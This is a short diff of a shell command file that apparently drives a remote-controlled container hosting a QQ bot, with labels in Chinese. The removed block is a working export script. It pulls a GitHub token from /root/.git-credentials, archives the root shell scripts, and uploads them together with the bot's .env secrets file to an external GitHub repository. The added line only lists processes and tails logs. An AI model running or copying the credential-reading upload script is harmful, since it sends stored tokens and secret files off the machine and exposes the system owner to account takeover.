@@ -1,20 +1,2 @@
-285316
-echo "==X10迁移导出 $(date '+%m-%d %H:%M')=="
-T=$(grep -oE 'ghp_[A-Za-z0-9]+' /root/.git-credentials 2>/dev/null | head -1); echo "token前缀:${T:0:8}"
-tar czf /tmp/phone_scripts.tar.gz /root/*.sh 2>/dev/null; ls -la /tmp/phone_scripts.tar.gz
-up() { B64=$(base64 -w0 "$1"); SHA=$(curl -s --max-time 15 -H "Authorization: token $T" "https://api.github.com/repos/Thousands91/-1/contents/$2" | python3 -c "import sys,json;print(json.load(sys.stdin).get('sha',''))" 2>/dev/null); GTOK="$T" B64="$B64" SHA="$SHA" URL="https://api.github.com/repos/Thousands91/-1/contents/$2" python3 - <<'PY'
-import json, os, urllib.request
-payload = {"message": "x10 export", "content": os.environ["B64"], "branch": "main"}
-if os.environ["SHA"]:
-    payload["sha"] = os.environ["SHA"]
-req = urllib.request.Request(os.environ["URL"], data=json.dumps(payload).encode(), method="PUT",
-    headers={"Authorization": "token " + os.environ["GTOK"], "Content-Type": "application/json"})
-try:
-    print(os.environ["URL"].split("contents/")[-1], "->", urllib.request.urlopen(req).status)
-except Exception as e:
-    print(os.environ["URL"].split("contents/")[-1], "FAIL:", e)
-PY
-}
-up /tmp/phone_scripts.tar.gz "x10/phone_scripts.tar.gz"
-up /root/bot/bot/.env "x10/env.env"
-echo "==导出完毕，结果随下一轮回传=="
+285317
+echo "==进程清单=="; ps -eo args | grep -E "[r]emote_ctl|[o]pt/QQ/qq|[m]ain.py|[n]etmon|[o]ffline_watch|[a]zar_guard"; echo "==容器进程总数=="; ps -e 2>/dev/null | wc -l; echo "==bot日志尾=="; tail -3 /root/bot.log 2>/dev/null; tail -3 /root/bot/bot/bot.log 2>/dev/null; echo "==NapCat日志尾=="; tail -3 /root/napcat.log 2>/dev/null; tail -3 /root/napcat-run.log 2>/dev/null; echo "==登录检查=="; bash /root/logincheck.sh 2>/dev/null | tail -5
